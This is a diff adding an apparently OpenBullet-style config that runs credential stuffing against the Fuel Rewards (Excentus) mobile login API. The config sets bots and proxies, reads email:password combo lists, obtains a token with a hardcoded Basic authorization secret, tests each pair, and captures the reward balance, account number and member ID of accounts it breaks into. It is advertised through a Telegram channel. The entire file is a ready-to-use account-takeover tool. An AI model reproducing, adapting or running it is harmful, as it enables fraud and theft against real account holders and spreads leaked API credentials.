@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "Fuel Rewards#ConfigsGram",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-18T16:48:34.3847887+05:30",
+  "AdditionalInfo": "Join us: @ConfigsGram",
+  "Author": "@B_L_U_E_HAWK",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#1 REQUEST POST "https://auth-connect.excentus.com/authservice/v2/accesstokens" 
+  CONTENT "bizType=B2C&grant_type=client_credentials" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/plain,application/json;odata=verbose" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Basic MjkxYTc0Y2UtZTM5NS00MmMzLTgxYzQtZGQ2NzQzOGM3ZTAxOjVhOWMzNjIyLWJiYWEtNDMxMC1iYmE0LTU1YWNhYTExNjYzZg==" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 41" 
+  HEADER "Host: auth-connect.excentus.com" 
+  HEADER "User-Agent: CCMDMobile/2 CFNetwork/1121.2.2 Darwin/19.2.0" 
+
+#at PARSE "<SOURCE>" JSON "accessToken" -> VAR "at" 
+
+#2 REQUEST POST "https://member-connect.excentus.com/fuelrewards/public/rest/v2/frnExcentus/login" 
+  CONTENT "{\"partnerAttributes\":{\"value\":\"Fleet\",\"partnerAssociation\":\"frprombr\",\"name\":\"TIER\",\"participantId\":\"Fleet\"},\"userId\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: text/plain,application/json;odata=verbose" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "access_token: <at>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: member-connect.excentus.com" 
+  HEADER "tags: [{\"deviceModeType\":\"cons\",\"deviceType\":\"iph\",\"DeviceID\":\"iPhone\",\"deviceOSVer\":\"13.3\"}]" 
+  HEADER "User-Agent: CCMDMobile/2 CFNetwork/1121.2.2 Darwin/19.2.0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "responseCode\":\"SUCCESS" 
+  KEYCHAIN Failure OR 
+    KEY "User Not Found" 
+
+#rb PARSE "<SOURCE>" JSON "rewardBalance" CreateEmpty=FALSE -> CAP "Rewards Balance" 
+
+#an PARSE "<SOURCE>" JSON "accountNumber" CreateEmpty=FALSE -> CAP "Account number" 
+
+#s PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Status" 
+
+#memid PARSE "<SOURCE>" JSON "memberId" CreateEmpty=FALSE -> CAP "Member ID" 
+
+#bebo FUNCTION Constant "@ConfigsGram" -> CAP "Join us" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Rewards Balance>" LessThan "10" 
+
